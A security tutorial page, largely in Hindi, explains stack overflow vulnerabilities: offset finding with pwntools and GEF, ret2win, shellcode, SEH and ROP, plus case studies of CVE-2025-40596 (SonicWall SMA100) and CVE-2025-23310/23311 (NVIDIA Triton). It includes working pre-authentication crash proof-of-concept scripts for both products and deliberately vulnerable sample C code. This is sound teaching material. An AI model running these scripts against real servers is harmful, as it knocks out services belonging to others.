# Stack Overflow

{{#include ../../banners/hacktricks-training.md}}

## Stack Overflow क्या है

A **stack overflow** एक ऐसी vulnerability है जो तब होती है जब कोई प्रोग्राम stack में उस मात्रा से अधिक डेटा लिख देता है जितना उसे होल्ड करने के लिए आवंटित किया गया है। यह अतिरिक्त डेटा **adjacent memory space को overwrite** कर देगा, जिससे वैध डेटा का भ्रष्ट होना, control flow का बाधित होना, और संभावित रूप से malicious code का execution हो सकता है। यह समस्या अक्सर unsafe functions के उपयोग के कारण आती है जो इनपुट पर bounds checking नहीं करते।

मुख्य समस्या इस overwrite की यह है कि **saved instruction pointer (EIP/RIP)** और **saved base pointer (EBP/RBP)**, जो previous function पर लौटने के लिए उपयोग होते हैं, **stack पर stored** होते हैं। इसलिए, एक attacker उनको overwrite कर सकेगा और प्रोग्राम के execution flow को **control** कर सकेगा।

यह vulnerability आमतौर पर इसलिए उत्पन्न होती है क्योंकि कोई function **stack के अंदर उस के लिए आवंटित मात्रा से अधिक bytes copy करता है**, जिससे वह स्टैक के अन्य हिस्सों को overwrite करने में सक्षम हो जाता है।

कुछ सामान्य functions जो इस के लिए vulnerable हो सकते हैं: **`strcpy`, `strcat`, `sprintf`, `gets`**... साथ ही, ऐसे functions जैसे **`fgets`**, **`read`** और **`memcpy`** जो एक **length argument** लेते हैं, यदि निर्दिष्ट length आवंटित मात्रा से अधिक हो तो vulnerable तरीके से उपयोग किए जा सकते हैं।

For example, the following functions could be vulnerable:
```c
void vulnerable() {
char buffer[128];
printf("Enter some text: ");
gets(buffer); // This is where the vulnerability lies
printf("You entered: %s\n", buffer);
}
```
### Stack Overflows offsets ढूँढना

Stack overflows खोजने का सबसे सामान्य तरीका बहुत बड़ा `A` इनपुट देना है (उदा. `python3 -c 'print("A"*1000)'`) और फिर `Segmentation Fault` की उम्मीद करना है, जो यह दर्शाता है कि **address `0x41414141` को एक्सेस करने की कोशिश की गई थी**।

इसके अलावा, एक बार जब आप पाते हैं कि Stack Overflow vulnerability है, तो आपको वह offset ढूँढना होगा जहाँ तक कि **return address को overwrite करना** संभव हो; इसके लिए आमतौर पर **De Bruijn sequence** का उपयोग किया जाता है। दिए गए alphabet के आकार _k_ और subsequences की लंबाई _n_ के लिए यह एक **cyclic sequence है जिसमें हर संभव subsequence जिसकी लंबाई _n_ है, बिल्कुल एक बार** contiguous subsequence के रूप में दिखाई देता है।

इस तरह, हाथ से यह पता लगाने की बजाय कि EIP को control करने के लिए कौन सा offset चाहिए, आप padding के रूप में इन sequences में से एक का उपयोग कर सकते हैं और फिर उन bytes का offset पता लगा सकते हैं जिन्होंने अंततः उसे overwrite कर दिया।

इसके लिए **pwntools** का उपयोग किया जा सकता है:
```python
from pwn import *

# Generate a De Bruijn sequence of length 1000 with an alphabet size of 256 (byte values)
pattern = cyclic(1000)

# This is an example value that you'd have found in the EIP/IP register upon crash
eip_value = p32(0x6161616c)
offset = cyclic_find(eip_value)  # Finds the offset of the sequence in the De Bruijn pattern
print(f"The offset is: {offset}")
```
या **GEF**:
```bash
#Patterns
pattern create 200 #Generate length 200 pattern
pattern search "avaaawaa" #Search for the offset of that substring
pattern search $rsp #Search the offset given the content of $rsp
```
## Stack Overflows का शोषण

During an overflow (supposing the overflow size if big enough) you will be able to **ओवरराइट** values of local variables inside the stack until reaching the saved **EBP/RBP and EIP/RIP (or even more)**.\
The most common way to abuse this type of vulnerability is by **रिटर्न एड्रेस को मॉडिफाइ करना** ताकि जब फ़ंक्शन समाप्त हो तो **कंट्रोल फ्लो उस प्वाइंटर में यूज़र द्वारा निर्धारित जगह पर रीडायरेक्ट हो जाए**।

हालाँकि, अन्य परिदृश्यों में सिर्फ़ स्टैक में कुछ वेरिएबल्स के मान **ओवरराइट** करना ही exploit के लिए पर्याप्त हो सकता है (जैसे आसान CTF चुनौतियों में)।

### Ret2win

In this type of CTF challenges, there is a **function** **inside** the binary that is **never called** and that **you need to call in order to win**. For these challenges you just need to find the **offset to overwrite the return address** and **find the address of the function** to call (usually [**ASLR**](../common-binary-protections-and-bypasses/aslr/index.html) would be disabled) so when the vulnerable function returns, the hidden function will be called:


{{#ref}}
ret2win/
{{#endref}}

### Stack Shellcode

इस परिदृश्य में हमलावर स्टैक में shellcode रख सकता है और नियंत्रित EIP/RIP का दुरुपयोग करके shellcode पर कूदकर arbitrary code निष्पादित कर सकता है:


{{#ref}}
stack-shellcode/
{{#endref}}

### Windows SEH-based exploitation (nSEH/SEH)

On 32-bit Windows, an overflow may overwrite the Structured Exception Handler (SEH) chain instead of the saved return address. Exploitation typically replaces the SEH pointer with a POP POP RET gadget and uses the 4-byte nSEH field for a short jump to pivot back into the large buffer where shellcode lives. A common pattern is a short jmp in nSEH that lands on a 5-byte near jmp placed just before nSEH to jump hundreds of bytes back to the payload start.


{{#ref}}
windows-seh-overflow.md
{{#endref}}

### ROP & Ret2... techniques

This technique is the fundamental framework to bypass the main protection to the previous technique: **No executable stack (NX)**. And it allows to perform several other techniques (ret2lib, ret2syscall...) that will end executing arbitrary commands by abusing existing instructions in the binary:


{{#ref}}
../rop-return-oriented-programing/
{{#endref}}

## Heap Overflows

An overflow is not always going to be in the stack, it could also be in the **heap** for example:


{{#ref}}
../libc-heap/heap-overflow.md
{{#endref}}

## Types of protections

There are several protections trying to prevent the exploitation of vulnerabilities, check them in:


{{#ref}}
../common-binary-protections-and-bypasses/
{{#endref}}

### Real-World Example: CVE-2025-40596 (SonicWall SMA100)

A good demonstration of why **`sscanf` को अनट्रस्टेड इनपुट पार्स करने के लिए कभी भरोसा नहीं किया जाना चाहिए** appeared in 2025 in SonicWall’s SMA100 SSL-VPN appliance.
The vulnerable routine inside `/usr/src/EasyAccess/bin/httpd` attempts to extract the version and endpoint from any URI that begins with `/__api__/`:
```c
char version[3];
char endpoint[0x800] = {0};
/* simplified proto-type */
sscanf(uri, "%*[^/]/%2s/%s", version, endpoint);
```
1. पहला conversion (`%2s`) सुरक्षित रूप से `version` में **दो** bytes स्टोर करता है (उदा. `"v1"`).
2. दूसरा conversion (`%s`) **कोई length specifier नहीं** है, इसलिए `sscanf` **पहले NUL byte** तक कॉपी करना जारी रखेगा।
3. क्योंकि `endpoint` **stack** पर स्थित है और **0x800 bytes long** है, 0x800 bytes से लंबा path देने पर buffer के बाद जो कुछ भी है वह corrupt हो जाएगा ‑ इसमें **stack canary** और **saved return address** भी शामिल हैं।

एक single-line proof-of-concept क्रैश को ट्रिगर करने के लिए पर्याप्त है, और यह कर देता है **authentication से पहले**:
```python
import requests, warnings
warnings.filterwarnings('ignore')
url = "https://TARGET/__api__/v1/" + "A"*3000
requests.get(url, verify=False)
```
हालाँकि stack canaries प्रक्रिया को रोक देते हैं, एक हमलावर फिर भी एक **Denial-of-Service** primitive हासिल कर लेता है (और, अतिरिक्त information leaks के साथ, संभवतः code-execution)। सबक सरल है:

* हमेशा एक **अधिकतम फ़ील्ड चौड़ाई** प्रदान करें (उदा. `%511s`)।
* ऐसे सुरक्षित विकल्पों को प्राथमिकता दें जैसे `snprintf`/`strncpy_s`।

### वास्तविक दुनिया का उदाहरण: CVE-2025-23310 & CVE-2025-23311 (NVIDIA Triton Inference Server)

NVIDIA’s Triton Inference Server (≤ v25.06) में इसके HTTP API के माध्यम से पहुँचने योग्य कई **stack-based overflows** थे।
यह कमजोर पैटर्न बार-बार `http_server.cc` और `sagemaker_server.cc` में दिखाई देता था:
```c
int n = evbuffer_peek(req->buffer_in, -1, NULL, NULL, 0);
if (n > 0) {
/* allocates 16 * n bytes on the stack */
struct evbuffer_iovec *v = (struct evbuffer_iovec *)
alloca(sizeof(struct evbuffer_iovec) * n);
...
}
```
1. `evbuffer_peek` (libevent) वर्तमान HTTP request body को बनाकर रखने वाले **आंतरिक बफर सेगमेंट्स की संख्या** लौटाता है।
2. प्रत्येक सेगमेंट `alloca()` के माध्यम से **stack** पर एक **16-byte** `evbuffer_iovec` आवंटित करवा देता है – **बिना किसी ऊपरी सीमा के**।
3. **HTTP _chunked transfer-encoding_** का दुरुपयोग करके, एक client अनुरोध को **सैकड़ों-हज़ारों 6-byte chunks** (`"1\r\nA\r\n"`) में विभाजित करने के लिए मजबूर कर सकता है। इससे `n` अनियंत्रित रूप से बढ़ता जाता है जब तक **stack** समाप्त न हो जाए।

#### प्रूफ-ऑफ-कॉन्सेप्ट (DoS)
```python
#!/usr/bin/env python3
import socket, sys

def exploit(host="localhost", port=8000, chunks=523_800):
s = socket.create_connection((host, port))
s.sendall((
f"POST /v2/models/add_sub/infer HTTP/1.1\r\n"
f"Host: {host}:{port}\r\n"
"Content-Type: application/octet-stream\r\n"
"Inference-Header-Content-Length: 0\r\n"
"Transfer-Encoding: chunked\r\n"
"Connection: close\r\n\r\n"
).encode())

for _ in range(chunks):                  # 6-byte chunk ➜ 16-byte alloc
s.send(b"1\r\nA\r\n")            # amplification factor ≈ 2.6x
s.sendall(b"0\r\n\r\n")               # end of chunks
s.close()

if __name__ == "__main__":
exploit(*sys.argv[1:])
```
एक ~3 MB request default build पर saved return address को overwrite करके daemon को **crash** करने के लिए पर्याप्त है।

#### पैच और निवारण
25.07 रिलीज़ unsafe stack allocation को **heap-backed `std::vector`** से बदलती है और `std::bad_alloc` को सही तरीके से संभालती है:
```c++
std::vector<evbuffer_iovec> v_vec;
try {
v_vec = std::vector<evbuffer_iovec>(n);
} catch (const std::bad_alloc &e) {
return TRITONSERVER_ErrorNew(TRITONSERVER_ERROR_INVALID_ARG, "alloc failed");
}
struct evbuffer_iovec *v = v_vec.data();
```
सीखे गए सबक:
* कभी भी attacker-controlled sizes के साथ `alloca()` को कॉल न करें।
* Chunked requests सर्वर-साइड बफर्स के आकार को नाटकीय रूप से बदल सकते हैं।
* client input से प्राप्त किसी भी value को memory allocations में उपयोग करने से *पहले* validate / cap करें।

## संदर्भ
* [watchTowr Labs – Stack Overflows, Heap Overflows and Existential Dread (SonicWall SMA100)](https://labs.watchtowr.com/stack-overflows-heap-overflows-and-existential-dread-sonicwall-sma100-cve-2025-40596-cve-2025-40597-and-cve-2025-40598/)
* [Trail of Bits – Uncovering memory corruption in NVIDIA Triton](https://blog.trailofbits.com/2025/08/04/uncovering-memory-corruption-in-nvidia-triton-as-a-new-hire/)
* [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf)](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)

{{#include ../../banners/hacktricks-training.md}}
